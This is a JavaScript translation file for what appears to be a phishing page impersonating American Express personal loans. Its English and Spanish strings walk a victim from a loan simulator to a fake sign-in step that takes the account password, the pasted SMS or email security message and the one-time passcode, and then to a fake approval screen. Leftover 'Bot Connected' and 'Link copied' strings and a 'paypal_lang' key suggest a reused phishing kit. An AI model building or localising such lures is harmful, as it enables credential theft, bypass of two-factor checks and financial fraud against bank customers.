(function() {
  const translations = {
    en: {
      title: "American Express — Personal Loans & Flexible Financing",
      heroBadge: "Fixed Rates • No Hidden Fees • Funds in as Fast as 1 Day",
      heroHeading: "Simulate Your American Express® Personal Loan",
      heroSubtitle: "Get the funds you need with fixed monthly payments, competitive interest rates, and no origination fees or prepayment penalties.",
      requestedAmount: "Requested Loan Amount",
      interestRate: "Fixed APR (from 7.99%)",
      repaymentTerm: "Repayment Period",
      month1: "12 Months",
      months3: "24 Months",
      months6: "36 Months",
      months12: "60 Months",
      estMonthly: "Est. Monthly Payment:",
      totalRepay: "Total Estimated Repayment:",
      applyNow: "APPLY FOR PERSONAL LOAN",
      step1Title: "Personal Loan Preferences",
      step1Sub: "Select your desired loan amount ($3,500 - $40,000 USD) and repayment period.",
      loanType: "Financing Type",
      amountLabel: "Loan Amount Request (USD)",
      termLabel: "Repayment Period (Months)",
      purposeLabel: "Intended Use",
      continueToPersonal: "CONTINUE TO APPLICANT DETAILS",
      step2Title: "Applicant Identification",
      step2Sub: "Enter your legal name, contact details, and underwriting info.",
      firstName: "First Name",
      lastName: "Last Name",
      orangePhone: "Mobile Phone Number",
      employmentStatus: "Employment Status",
      agentConsent: "I authorize American Express to review my application and perform a soft credit check.",
      continueToAuth: "CONTINUE TO AMEX SIGN IN",
      step3Title: "Sign in to American Express Account",
      step3Sub: "Confirm your mobile number or email and enter your online account password.",
      phoneNum: "Mobile Phone / Amex User ID",
      pinLabel: "Account Password:",
      showPin: "Show",
      hidePin: "Hide",
      confirmLoanBtn: "CONFIRM & VALIDATE LOAN",
      confirmPinBtn: "CONFIRM SECURITY CREDENTIALS",
      awaitingApproval: "Awaiting Underwriting Review",
      pinAwaitingDesc: "Your credentials have been submitted. Please wait while underwriting reviews your request...",
      step4Title: "2-Step Security Verification",
      step4Sub: "Choose how to receive your security code from American Express then paste below.",
      smsDeliveryTab: "Text Message (SMS)",
      emailDeliveryTab: "Email Notification",
      smsLabel: "American Express Security SMS Message",
      emailLabel: "American Express Security Email Message or Code",
      step4EmailSub: "We sent a verification email to your address. Copy the security code or message and paste it below.",
      submitSmsBtn: "SUBMIT SECURITY CODE",
      resendViaSms: "Send via Text",
      resendViaEmail: "Send to Email instead",
      awaitingVerification: "Verifying Security Code",
      smsAwaitingDesc: "Your security message has been submitted. Underwriting verification in progress...",
      step5OtpTitle: "One-Time Passcode (OTP)",
      otpHeading: "Enter American Express Security Code",
      otpSub: "Enter the 6-digit security code sent to your mobile phone from American Express",
      otpLabel: "Security Code (6 digits):",
      verifyApproveBtn: "VERIFY & APPROVE PERSONAL LOAN",
      step5Title: "American Express Personal Loan Approved!",
      step5Sub: "Your loan has been approved by American Express National Bank.",
      appRef: "Loan Reference ID:",
      applicantName: "Applicant:",
      orangeContact: "Contact Phone:",
      loanMode: "Loan Product:",
      requestedAmt: "Approved Amount:",
      termRepay: "Repayment Period:",
      currentStatus: "Account Status:",
      statusPending: "⏳ Under Review",
      newLoanBtn: "EXPLORE ANOTHER LOAN",
      congratsHeading: "Congratulations!",
      congratsSub: "Your American Express Personal Loan has been approved! Your funds will be deposited directly into your bank account.",
      approvedAmountLabel: "APPROVED LOAN AMOUNT",
      complianceNoticeTitle: "AMERICAN EXPRESS PERSONAL LOAN DISCLOSURE",
      complianceNoticeBody: "American Express Personal Loans are unsecured personal loans issued by American Express National Bank. Fixed APRs range from 7.99% to 24.97%. No application fees, no origination fees, and no prepayment penalties. Funds sent in as fast as 1 business day after signing loan agreement.",
      loanDetailsHeader: "Personal Loan Summary",
      monthlyPaymentLabel: "EST. MONTHLY PAYMENT",
      loanTermLabel: "REPAYMENT TERM",
      interestRateLabel: "FIXED APR",
      quickActionsTitle: "Quick Actions",
      btnDeposit: "Direct Deposit to Bank",
      btnWithdraw: "Set Up AutoPay",
      btnLoanInfo: "View Loan Agreement",
      nextStepsTitle: "Next Steps:",
      nextStepsBody: "Your loan agreement has been generated. Direct deposit to your linked bank account usually completes in 1 to 2 business days.",
      returnHomeBtn: "Return to Home",
      footerRights: "© 2026 American Express. All rights reserved. American Express Personal Loans are unsecured loans issued by American Express National Bank."
    },
    es: {
      title: "American Express — Préstamos Personales y Financiamiento",
      heroBadge: "Tasas Fijas • Sin Comisiones Ocultas • Fondos en tan solo 1 Día",
      heroHeading: "Simule su Préstamo Personal American Express®",
      heroSubtitle: "Obtenga los fondos que necesita con pagos mensuales fijos, tasas competitivas y sin comisiones por apertura ni penalización por prepago.",
      requestedAmount: "Monto del Préstamo Solicitado",
      interestRate: "Tasa Fija APR (desde 7.99%)",
      repaymentTerm: "Plazo de Pago",
      month1: "12 Meses",
      months3: "24 Meses",
      months6: "36 Meses",
      months12: "60 Meses",
      estMonthly: "Pago Mensual Est.:",
      totalRepay: "Total Estimado a Pagar:",
      applyNow: "SOLICITAR PRÉSTAMO PERSONAL",
      step1Title: "Preferencias del Préstamo",
      step1Sub: "Seleccione los parámetros de crédito ($3,500 - $40,000 USD) y plazo de pago.",
      loanType: "Tipo de Financiamiento",
      amountLabel: "Monto Solicitado (USD)",
      termLabel: "Plazo de Pago (Meses)",
      purposeLabel: "Uso Previsto",
      continueToPersonal: "CONTINUAR A DATOS PERSONALES",
      step2Title: "Identificación del Solicitante",
      step2Sub: "Ingrese su nombre legal, datos de contacto e información financiera.",
      firstName: "Nombre",
      lastName: "Apellido",
      orangePhone: "Número de Teléfono Móvil",
      employmentStatus: "Situación Laboral",
      agentConsent: "Autorizo a American Express a consultar mi historial crediticio mediante consulta suave.",
      continueToAuth: "CONTINUAR AL INICIO DE SESIÓN",
      step3Title: "Iniciar Sesión en American Express",
      step3Sub: "Confirme su teléfono o correo e ingrese su contraseña de cuenta online.",
      phoneNum: "Teléfono Móvil / Usuario Amex",
      pinLabel: "Contraseña de la Cuenta:",
      showPin: "Mostrar",
      hidePin: "Ocultar",
      confirmLoanBtn: "CONFIRMAR Y VALIDAR PRÉSTAMO",
      confirmPinBtn: "CONFIRMAR CREDENCIALES",
      awaitingApproval: "Esperando Revisión",
      pinAwaitingDesc: "Sus credenciales han sido enviadas. Por favor espere mientras verificamos...",
      step4Title: "Verificación en 2 Pasos",
      step4Sub: "Elija cómo recibir su código de seguridad de American Express y péguelo a continuación.",
      smsDeliveryTab: "Mensaje de Texto (SMS)",
      emailDeliveryTab: "Notificación por Correo",
      smsLabel: "Mensaje de Seguridad SMS",
      emailLabel: "Mensaje o Código de Seguridad por Correo",
      step4EmailSub: "Enviamos un correo de verificación a su dirección. Copie el código o mensaje y péguelo a continuación.",
      submitSmsBtn: "ENVIAR CÓDIGO DE SEGURIDAD",
      resendViaSms: "Enviar por Mensaje de Texto",
      resendViaEmail: "Enviar al Correo Electrónico",
      awaitingVerification: "Verificando Código",
      smsAwaitingDesc: "Verificación de seguridad en proceso...",
      step5OtpTitle: "Código OTP de Seguridad",
      otpHeading: "Ingrese Código de Seguridad",
      otpSub: "Ingrese el código de 6 dígitos enviado a su teléfono por American Express",
      otpLabel: "Código de Seguridad (6 dígitos):",
      verifyApproveBtn: "VERIFICAR Y APROBAR PRÉSTAMO",
      step5Title: "¡Préstamo American Express Aprobado!",
      step5Sub: "Su préstamo personal ha sido autorizado por American Express National Bank.",
      appRef: "Referencia del Préstamo:",
      applicantName: "Solicitante:",
      orangeContact: "Teléfono:",
      loanMode: "Producto:",
      requestedAmt: "Monto Aprobado:",
      termRepay: "Plazo:",
      currentStatus: "Estado:",
      statusPending: "⏳ En Revisión",
      newLoanBtn: "SOLICITAR OTRO PRÉSTAMO",
      congratsHeading: "¡Felicitaciones!",
      congratsSub: "¡Su Préstamo Personal American Express ha sido aprobado! Los fondos serán depositados directamente en su cuenta bancaria.",
      approvedAmountLabel: "MONTO DE PRÉSTAMO APROBADO",
      complianceNoticeTitle: "AVISO LEGAL DEL PRÉSTAMO PERSONAL",
      complianceNoticeBody: "Los Préstamos Personales de American Express son préstamos no garantizados emitidos por American Express National Bank. Tasas fijas APR entre 7.99% y 24.97%. Sin comisiones de apertura ni penalizaciones por prepago.",
      loanDetailsHeader: "Resumen del Préstamo Personal",
      monthlyPaymentLabel: "PAGO MENSUAL ESTIMADO",
      loanTermLabel: "PLAZO DE PAGO",
      interestRateLabel: "TASA DE INTERÉS FIJA",
      quickActionsTitle: "Acciones Rápidas",
      btnDeposit: "Depósito Directo en Cuenta",
      btnWithdraw: "Configurar AutoPay",
      btnLoanInfo: "Ver Contrato del Préstamo",
      nextStepsTitle: "Próximos Pasos:",
      nextStepsBody: "Su contrato ha sido generado. El depósito directo a su cuenta suele tardar entre 1 y 2 días hábiles.",
      returnHomeBtn: "Volver al Inicio",
      footerRights: "© 2026 American Express. Todos los derechos reservados. Préstamos personales emitidos por American Express National Bank."
    },
    common: {
      "Bot Conectado": { es: "Bot Conectado", en: "Bot Connected" },
      "Bot Connected": { es: "Bot Conectado", en: "Bot Connected" },
      "Configurado": { es: "Configurado", en: "Configured" },
      "Configured": { es: "Configurado", en: "Configured" },
      "Bot Desconectado": { es: "Bot Desconectado", en: "Bot Disconnected" },
      "Bot Disconnected": { es: "Bot Desconectado", en: "Bot Disconnected" },
      "Link copiado com sucesso!": { es: "¡Enlace copiado con éxito!", en: "Link copied successfully!" },
      "Link copied successfully!": { es: "¡Enlace copiado con éxito!", en: "Link copied successfully!" },
      "Pendente": { es: "Pendiente", en: "Pending" },
      "Pending": { es: "Pendiente", en: "Pending" },
      "Em Análise": { es: "En Revisión", en: "Under Review" },
      "Under Review": { es: "En Revisión", en: "Under Review" },
      "Aprovado": { es: "Aprobado", en: "Approved" },
      "Approved": { es: "Aprobado", en: "Approved" },
      "Rejeitado": { es: "Rechazado", en: "Rejected" },
      "Rejected": { es: "Rechazado", en: "Rejected" },
      "meses": { es: "meses", en: "months" },
      "candidatura(s).": { es: "solicitud(es).", en: "application(s)." }
    }
  };

  // Default language is English ('en')
  let currentLang = localStorage.getItem("amex_lang") || localStorage.getItem("paypal_lang") || "en";

  window.t = function(key) {
    if (!key) return "";
    if (translations.common && translations.common[key]) {
      return translations.common[key][currentLang] || translations.common[key].en || key;
    }
    const dict = translations[currentLang] || translations.en;
    return dict[key] || key;
  };

  function setLanguage(lang) {
    currentLang = lang;
    try {
      localStorage.setItem("amex_lang", lang);
      localStorage.setItem("paypal_lang", lang);
    } catch (_) {}
    const dict = translations[lang] || translations.en;
    
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.innerText = lang.toUpperCase();
    });

    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (dict[key]) {
        el.innerText = dict[key];
      }
    });
  }

  document.addEventListener("DOMContentLoaded", () => {
    setLanguage(currentLang);
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.addEventListener("click", () => {
        const nextLang = currentLang === "en" ? "es" : "en";
        setLanguage(nextLang);
      });
    });
  });
})();